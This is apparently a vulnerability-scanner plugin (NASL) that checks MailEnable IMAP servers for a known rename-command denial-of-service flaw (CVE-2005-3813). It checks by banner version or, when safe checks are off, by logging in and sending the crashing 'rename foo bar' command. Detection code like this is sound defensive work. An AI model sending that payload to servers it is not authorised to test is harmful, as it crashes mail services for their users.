if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.20245" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)" );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:N/I:N/A:P" );
	script_cve_id( "CVE-2005-3813" );
	script_bugtraq_id( 15556 );
	script_xref( name: "OSVDB", value: "21109" );
	script_name( "MailEnable IMAP rename DoS Vulnerability" );
	script_category( ACT_MIXED_ATTACK );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2005 Josh Zlatin-Amishav" );
	script_dependencies( "smtpserver_detect.sc", "imap4_banner.sc" );
	script_require_ports( "Services/smtp", 25, "Services/imap", 143 );
	script_mandatory_keys( "imap/banner/available", "smtp/mailenable/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/417589" );
	script_xref( name: "URL", value: "http://www.mailenable.com/hotfix/MEIMAPS.ZIP" );
	script_tag( name: "solution", value: "Apply the IMAP Cumulative Hotfix/Update provided in the
  referenced zip file." );
	script_tag( name: "summary", value: "The remote IMAP server is running MailEnable which is
  prone to denial of service attacks." );
	script_tag( name: "insight", value: "The IMAP server bundled with the version of MailEnable Professional
  or Enterprise Edition installed on the remote host is prone to crash due to incorrect handling of
  mailbox names in the rename command." );
	script_tag( name: "impact", value: "An authenticated remote attacker can exploit this flaw to crash the
  IMAP server on the remote host." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_banner_unreliable" );
	exit( 0 );
}
require("imap_func.inc.sc");
require("smtp_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
if( safe_checks() ){
	port = smtp_get_port( default: 25 );
	banner = smtp_get_banner( port: port );
	if(IsMatchRegexp( banner, "Mail(Enable| Enable SMTP) Service" )){
		ver = eregmatch( pattern: "Version: (0-+)?([0-9][^- ]+)-*", string: banner, icase: TRUE );
		if(!ver){
			exit( 0 );
		}
		if( isnull( ver[1] ) ){
			edition = "Standard Edition";
		}
		else {
			if( ver[1] == "0-" ){
				edition = "Professional Edition";
			}
			else {
				if(ver[1] == "0--"){
					edition = "Enterprise Edition";
				}
			}
		}
		if(!edition){
			exit( 0 );
		}
		ver = ver[2];
		if(( edition == "Professional Edition" && IsMatchRegexp( ver, "^1\\.([0-6]|7$)" ) ) || ( edition == "Enterprise Edition" && IsMatchRegexp( ver, "^1\\.(0|1$)" ) )){
			report = report_fixed_ver( installed_version: ver + " " + edition, fixed_version: "See references" );
			security_message( port: port, data: report );
			exit( 0 );
		}
		exit( 99 );
	}
	exit( 0 );
}
else {
	kb_creds = imap_get_kb_creds();
	user = kb_creds["login"];
	pass = kb_creds["pass"];
	if(!user || !pass){
		exit( 0 );
	}
	port = imap_get_port( default: 143 );
	banner = imap_get_banner( port: port );
	if(!banner || !ContainsString( banner, "* OK IMAP4rev1 server ready" )){
		exit( 0 );
	}
	tag = 0;
	soc = open_sock_tcp( port );
	if(!soc){
		exit( 0 );
	}
	s = recv_line( socket: soc, length: 1024 );
	if(!s || !ContainsString( s, "IMAP4rev1 server ready at" )){
		close( soc );
		exit( 0 );
	}
	vtstrings = get_vt_strings();
	++tag;
	resp = NULL;
	c = NASLString( vtstrings["lowercase"], NASLString( tag ), " LOGIN ", user, " ", pass );
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024 );){
		s = chomp( s );
		m = eregmatch( pattern: NASLString( "^", vtstrings["lowercase"], NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
	}
	if(resp && IsMatchRegexp( resp, "OK" )){
		++tag;
		resp = NULL;
		++tag;
		payload = NASLString( vtstrings["lowercase"], NASLString( tag ), " rename foo bar" );
		send( socket: soc, data: NASLString( payload, "\\r\\n" ) );
		sleep( 5 );
		soc2 = open_sock_tcp( port );
		if(!soc2){
			security_message( port: port );
			exit( 0 );
		}
		close( soc2 );
	}
}

